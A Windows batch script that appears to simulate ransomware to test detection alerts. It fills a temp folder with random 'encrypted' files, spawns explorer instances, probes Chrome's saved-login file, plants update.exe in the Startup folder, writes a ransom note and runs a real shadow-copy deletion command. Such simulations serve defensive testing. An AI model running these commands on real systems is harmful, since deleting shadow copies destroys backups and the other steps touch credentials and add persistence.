@echo off
REM RANSOMWARE VARIANT - File Encryption + Credential Exfiltration Pattern
REM Different from REAL_MALWARE_1: Focuses on file operations and credential harvesting

set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"

setlocal enabledelayedexpansion

echo ============================================
echo RANSOMWARE VARIANT - File Encryption Attack
echo (File Operations + Credential Exfiltration)
echo ============================================
echo.

mkdir "%TEMP%\encrypt_payload" 2>nul

REM Stage 1: Generate encrypted victim files (high entropy)
echo [*] Stage 1: Generating encrypted file payloads
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "for ($i=0; $i -lt 40; $i++) { $bytes = [byte[]]::new(8192); [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:TEMP\encrypt_payload\encrypted_$i.dat\", $bytes) }"

REM Stage 2: Spawn multiple explorer instances (process anomaly)
echo [*] Stage 2: Spawning explorer.exe instances
for /l %%i in (1,1,12) do (
	start /min explorer.exe
	timeout /t 0 /nobreak
)

REM Stage 3: Rapid file operations (create temp encryption keys)
echo [*] Stage 3: Rapid file encryption operations
for /l %%i in (1,1,40) do (
	if exist "%TEMP%\encrypt_payload\encrypted_%%i.dat" (
		ren "%TEMP%\encrypt_payload\encrypted_%%i.dat" "encrypted_%%i.crypt" 2>nul
		for /f "delims=" %%%%x in ('dir "%TEMP%\encrypt_payload" /b') do (
			copy "%TEMP%\encrypt_payload\%%%%x" "%TEMP%\encrypt_payload\%%%%x.bak" >nul 2>&1
		)
	)
	timeout /t 5 /nobreak
)

REM Stage 4: Browser credential harvesting simulation
echo [*] Stage 4: Browser credential access
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { Get-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' -ErrorAction SilentlyContinue | Out-Null } catch { }"

REM Stage 5: Startup folder persistence
echo [*] Stage 5: Startup folder persistence
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "copy-item '%TEMP%\encrypt_payload\encrypted_0.dat' 'C:\Users\Public\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe' -ErrorAction SilentlyContinue"

REM Stage 6: VSSAdmin deletion (ransomware classic)
echo [*] Stage 6: Shadow copy deletion simulation
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { vssadmin delete shadows /all /quiet } catch { Write-Host 'VSS deletion failed (expected)' }" 2>nul

REM Stage 7: Ransom note creation and display
echo [*] Stage 7: Ransom note creation
(
	echo ============================================
	echo YOUR FILES HAVE BEEN ENCRYPTED
	echo ============================================
	echo All your documents, photos, and videos
	echo have been encrypted with military-grade AES-256.
	echo.
	echo Pay 2.5 BTC to: 1A1z7agoat48xT...
	echo ============================================
) > "%TEMP%\encrypt_payload\README.txt"

echo [+] Ransom note created

echo.
echo ============================================
echo RANSOMWARE VARIANT SIMULATION COMPLETE
echo Expected Alerts:
echo - Layer 0: HIGH ENTROPY (encrypted files > 7.9)
echo - Layer 2A: SPAWN RATE (12 explorer.exe instances)
echo - Layer 2A: EDGE BURST (80+ file operations)
echo - Layer 2B: REGISTRY P-MATRIX (startup folder modification)
echo - Layer 2C: COMPLEX GRAPH (VSS deletion + credential access)
echo ============================================

REM Cleanup
timeout /t 3 /nobreak
taskkill /f /im explorer.exe /fi "WINDOWTITLE eq explorer*" 2>nul
rmdir /s /q "%TEMP%\encrypt_payload" 2>nul
